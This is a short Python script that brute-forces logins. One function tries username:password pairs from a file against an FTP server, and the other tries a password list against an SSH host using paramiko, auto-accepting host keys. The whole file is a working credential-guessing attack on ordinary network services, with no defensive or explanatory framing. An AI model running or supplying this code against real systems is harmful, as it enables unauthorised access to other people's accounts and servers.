import paramiko
import ftplib

def Bruteforceftp(hostname, passwdFile):
    try:
        pF = open(passwdFile,"r")
    except:
        print("[!] File Doesnt Exist!")
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("[+] Trying: " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, passWord)
            print("[+] Login Suceeded With" + userName + "/" + passWord)
            ftp.quit()
            return(userName, passWord)
        except:
            pass
    print("[-] Password Not in list")


def Bruteforcessh(host, user, file):
    print("\nLOADING...")
    lines = file.readlines()

    for line in lines:
        try:
            end = len(line)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=user, password=line[0:end-1])
            print("[+]Correct ! -->", line)
        except:
            print("[-]Incorrect -->", line)
